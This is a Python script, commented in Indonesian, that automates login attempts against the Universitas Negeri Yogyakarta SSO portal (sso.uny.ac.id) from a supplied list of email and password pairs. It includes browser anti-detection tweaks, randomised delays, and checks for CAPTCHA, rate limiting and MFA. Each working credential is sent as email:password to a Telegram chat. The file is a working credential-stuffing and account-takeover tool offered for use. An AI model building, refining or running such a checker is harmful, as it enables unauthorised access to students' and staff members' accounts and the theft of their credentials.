"""
SSO Checker Bot Integration - Playwright Version
Wrapper untuk SSO UNY checker dengan callback ke Telegram
Optimized untuk Railway Hobby Plan (8GB RAM)
"""

from playwright.sync_api import sync_playwright
import time
import os
import random
from datetime import datetime


class SSOCheckerBot:
    """SSO Checker dengan integrasi Telegram Bot - Playwright"""
    
    def __init__(self, credentials, chat_id, bot):
        self.credentials = credentials
        self.chat_id = chat_id
        self.bot = bot
        self.success_list = []
        self.failed_list = []
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
    
    def setup_browser(self):
        """Setup Playwright Chromium browser (headless)"""
        self.playwright = sync_playwright().start()
        
        self.browser = self.playwright.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled',
                '--window-size=1920,1080',
            ]
        )
        
        self.context = self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        
        self.page = self.context.new_page()
        
        # Anti-detection
        self.page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        """)
        
        # Auto-dismiss dialogs
        self.page.on("dialog", lambda dialog: dialog.accept())
        
        print("✅ Playwright Chromium browser initialized")
    
    def detect_mfa(self):
        """Deteksi MFA/2FA berdasarkan halaman SSO UNY"""
        try:
            current_url = self.page.url.lower()
            page_source = self.page.content().lower()
            
            # URL-based detection
            mfa_url_keywords = ['mfa', '2fa', 'verify', 'verification', 'authenticator']
            if any(keyword in current_url for keyword in mfa_url_keywords):
                return True, "MFA detected in URL"
            
            # Text-based detection (Indonesian + English)
            mfa_text_keywords = [
                'perangkat mfa yang terdaftar',
                'silakan masukkan token',
                'masukkan token yang diperoleh',
                'google authenticator',
                'verification code',
                'enter code',
                'two-factor',
                'multi-factor',
                'verifikasi dua langkah',
                'kode verifikasi',
                'enter the code',
                'authentication code'
            ]
            
            for keyword in mfa_text_keywords:
                if keyword in page_source:
                    return True, f"MFA detected: {keyword}"
            
            # Element-based detection
            try:
                mfa_selectors = [
                    "input[name*='token' i]", "input[name*='code' i]", "input[name*='otp' i]",
                    "input[id*='token' i]", "input[id*='code' i]", "input[id*='otp' i]",
                    "input[placeholder*='token' i]", "input[placeholder*='code' i]", "input[placeholder*='otp' i]"
                ]
                for selector in mfa_selectors:
                    el = self.page.query_selector(selector)
                    if el and el.is_visible():
                        return True, "MFA input field detected"
            except:
                pass
            
            return False, "No MFA detected"
            
        except Exception as e:
            return False, f"MFA check error: {str(e)}"
    
    def check_login(self, email, password, index, total):
        """Check login untuk satu kredensial"""
        try:
            # Send progress to Telegram
            progress_msg = f"🔍 *[{index}/{total}]* Checking: `{email}`"
            self.bot.send_message(self.chat_id, progress_msg, parse_mode='Markdown')
            
            # Clear session
            self.context.clear_cookies()
            
            # Navigate ke halaman SSO dengan retry
            print(f"[DEBUG] Navigating to sso.uny.ac.id for {email}...")
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    # CRITICAL: pakai domcontentloaded, BUKAN load
                    # load = tunggu SEMUA resource (gambar, font, css) — sering timeout
                    # domcontentloaded = cukup tunggu HTML ready — lebih cepat & reliable
                    self.page.goto(
                        "https://sso.uny.ac.id",
                        wait_until="domcontentloaded",
                        timeout=15000
                    )
                    print(f"[DEBUG] Page navigated (attempt {attempt + 1})")
                    break
                except Exception as nav_err:
                    print(f"[DEBUG] Navigation attempt {attempt + 1} failed: {nav_err}")
                    if attempt == max_retries - 1:
                        return False, f"Gagal membuka halaman SSO setelah {max_retries} percobaan"
                    time.sleep(2)
            
            # Tunggu network idle (optional, jangan error kalau timeout)
            try:
                self.page.wait_for_load_state("networkidle", timeout=5000)
            except:
                pass
            
            time.sleep(random.uniform(1, 2))
            
            # Debug: cek URL dan ada form atau tidak
            current_url_before = self.page.url
            print(f"[DEBUG] Page loaded. URL: {current_url_before}")
            
            # Detect CAPTCHA
            try:
                for sel in ["iframe[src*='recaptcha']", "iframe[src*='hcaptcha']", "iframe[src*='captcha']"]:
                    captcha = self.page.query_selector(sel)
                    if captcha and captcha.is_visible():
                        error_msg = "🚨 CAPTCHA terdeteksi! Bot dihentikan."
                        self.bot.send_message(self.chat_id, error_msg)
                        return False, "CAPTCHA terdeteksi"
            except:
                pass
            
            # Check rate limiting
            page_text = self.page.content().lower()
            if 'too many requests' in page_text or 'rate limit' in page_text:
                error_msg = "🚨 Rate limit! Bot dihentikan. Tunggu beberapa menit."
                self.bot.send_message(self.chat_id, error_msg)
                return False, "Rate limit exceeded"
            
            # === FILL FORM ===
            try:
                # Tunggu form muncul (CRITICAL - ini yang bikin gagal sebelumnya)
                print(f"[DEBUG] Waiting for username field...")
                self.page.wait_for_selector("input[name='username']", state="visible", timeout=10000)
                print(f"[DEBUG] Username field found!")
                
                # Isi email - pakai page.fill() yang auto-wait
                self.page.fill("input[name='username']", email)
                print(f"[DEBUG] Email filled: {email}")
                time.sleep(0.3)
                
                # Isi password
                self.page.wait_for_selector("input[name='password']", state="visible", timeout=5000)
                self.page.fill("input[name='password']", password)
                print(f"[DEBUG] Password filled")
                time.sleep(0.3)
                
                # Klik tombol login
                print(f"[DEBUG] Clicking login button...")
                try:
                    submit_btn = self.page.wait_for_selector(
                        "button[type='submit'], input[type='submit']",
                        state="visible", timeout=5000
                    )
                    submit_btn.click()
                except:
                    # Fallback: submit via Enter
                    print(f"[DEBUG] Submit button not found, pressing Enter...")
                    self.page.press("input[name='password']", "Enter")
                
                print(f"[DEBUG] Login submitted, waiting for response...")
                
                # Tunggu navigasi/response (CRITICAL - harus cukup lama)
                time.sleep(3)
                
                # Tunggu halaman selesai load
                try:
                    self.page.wait_for_load_state("networkidle", timeout=10000)
                except:
                    time.sleep(2)
                
                print(f"[DEBUG] Page after login. URL: {self.page.url}")
                
                # Dismiss alerts/popups
                try:
                    self.page.keyboard.press("Escape")
                    time.sleep(0.2)
                except:
                    pass
                
                # Klik OK jika ada modal
                try:
                    ok_btn = self.page.query_selector("button:has-text('OK')")
                    if ok_btn and ok_btn.is_visible():
                        ok_btn.click()
                        time.sleep(1)
                except:
                    pass
                
                # === CHECK RESULT ===
                current_url = self.page.url
                page_source = self.page.content().lower()
                
                print(f"[DEBUG] Checking result...")
                print(f"[DEBUG] URL before: {current_url_before}")
                print(f"[DEBUG] URL after:  {current_url}")
                
                # ** Check MFA FIRST **
                mfa_detected, mfa_reason = self.detect_mfa()
                if mfa_detected:
                    print(f"[DEBUG] MFA detected: {mfa_reason}")
                    return False, f"MFA/2FA required ({mfa_reason})"
                
                # Fail indicators
                fail_keywords = [
                    'autentikasi gagal', 'authentication failed',
                    'invalid username or password', 'invalid credentials',
                    'incorrect', 'gagal login', 'login failed',
                    "couldn't sign you in", 'hubungi admin domain'
                ]
                
                # Check fail keywords FIRST
                for keyword in fail_keywords:
                    if keyword in page_source:
                        print(f"[DEBUG] FAIL keyword found: {keyword}")
                        return False, f"Autentikasi gagal: {keyword}"
                
                # Check Google error page
                if 'accounts.google.com' in current_url and ('error' in current_url.lower() or 'signin' in current_url.lower()):
                    print(f"[DEBUG] Google error page detected")
                    return False, "Google error page"
                
                # Cek apakah masih ada form login (berarti belum berhasil login)
                login_form_exists = self.page.query_selector("input[name='username']") is not None
                print(f"[DEBUG] Login form still exists: {login_form_exists}")
                
                # Success indicators
                success_keywords = [
                    'dashboard', 'logout', 'beranda',
                    'berhasil', 'selamat',
                    'sign out', 'keluar'
                ]
                
                # SSO UNY specific markers (post-login page)
                sso_success_markers = [
                    'berhasil masuk', 'selamat datang',
                    'webmail', 'siakad', 'besmart'
                ]
                
                # Check SSO success markers
                marker_hits = [m for m in sso_success_markers if m in page_source]
                if len(marker_hits) >= 1 and not login_form_exists:
                    print(f"[DEBUG] SUCCESS - SSO markers: {marker_hits}")
                    return True, f"Login berhasil (SSO: {', '.join(marker_hits)})"
                
                # Check success keywords in page
                for keyword in success_keywords:
                    if keyword in page_source and not login_form_exists:
                        print(f"[DEBUG] SUCCESS - keyword in page: {keyword}")
                        return True, f"Login berhasil: {keyword}"
                
                # Check success keywords in URL
                for keyword in success_keywords:
                    if keyword in current_url.lower():
                        print(f"[DEBUG] SUCCESS - keyword in URL: {keyword}")
                        return True, f"Login berhasil (URL): {keyword}"
                
                # URL changed = kemungkinan berhasil redirect
                url_changed = (current_url.rstrip('/') != current_url_before.rstrip('/'))
                
                if url_changed and not login_form_exists:
                    # URL berubah DAN form login sudah tidak ada
                    if 'sso.uny.ac.id' not in current_url and 'google.com' not in current_url:
                        print(f"[DEBUG] SUCCESS - redirected to: {current_url}")
                        return True, f"Login berhasil (redirect ke {current_url})"
                    
                    # Masih di domain SSO tapi bukan halaman login
                    if 'sso.uny.ac.id' in current_url:
                        # Cek apakah sudah di halaman dashboard SSO
                        if any(m in page_source for m in sso_success_markers):
                            print(f"[DEBUG] SUCCESS - SSO dashboard")
                            return True, "Login berhasil (SSO dashboard)"
                
                # Masih di halaman login
                if login_form_exists:
                    print(f"[DEBUG] FAIL - still at login page")
                    return False, "Masih di halaman login"
                
                # URL tidak berubah
                if not url_changed:
                    print(f"[DEBUG] FAIL - URL didn't change")
                    return False, "Masih di halaman login (URL tidak berubah)"
                
                # Jika sampai sini: URL berubah tapi tidak jelas hasilnya
                # Anggap gagal untuk menghindari false positive
                print(f"[DEBUG] UNCERTAIN - URL: {current_url}")
                return False, f"Tidak ada indikator sukses (URL: {current_url})"
                
            except Exception as e:
                print(f"[DEBUG] EXCEPTION during form fill: {str(e)}")
                # Coba screenshot untuk debug
                try:
                    self.page.screenshot(path=f"/tmp/debug_{index}.png")
                    print(f"[DEBUG] Screenshot saved: /tmp/debug_{index}.png")
                except:
                    pass
                return False, f"Error: {str(e)}"
        
        except Exception as e:
            print(f"[DEBUG] EXCEPTION during check_login: {str(e)}")
            return False, str(e)
    
    def start_checking(self):
        """Mulai proses checking semua kredensial"""
        try:
            # Setup browser
            self.bot.send_message(self.chat_id, "🚀 Memulai browser (Playwright)...")
            self.setup_browser()
            
            total = len(self.credentials)
            
            for idx, (email, password) in enumerate(self.credentials, 1):
                success, message = self.check_login(email, password, idx, total)
                
                print(f"[RESULT] {email}: {'SUCCESS' if success else 'FAIL'} - {message}")
                
                if success:
                    self.success_list.append((email, password, message))
                    
                    # SEND REAL-TIME NOTIFICATION
                    success_msg = f"✅ *BERHASIL!*\n`{email}:{password}`"
                    self.bot.send_message(self.chat_id, success_msg, parse_mode='Markdown')
                else:
                    self.failed_list.append((email, password, message))
                    
                    # Kirim alasan gagal ke user (untuk debugging)
                    fail_msg = f"❌ *[{idx}/{total}]* `{email}`\n_{message}_"
                    try:
                        self.bot.send_message(self.chat_id, fail_msg, parse_mode='Markdown')
                    except:
                        pass
                    
                    # Stop if CAPTCHA or rate limit
                    if 'CAPTCHA' in message or 'Rate limit' in message:
                        break
                
                # Delay between attempts
                if idx < total:
                    wait_time = random.uniform(0.5, 1.5)
                    time.sleep(wait_time)
        
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Cleanup browser resources"""
        try:
            if self.page:
                self.page.close()
            if self.context:
                self.context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
        except:
            pass
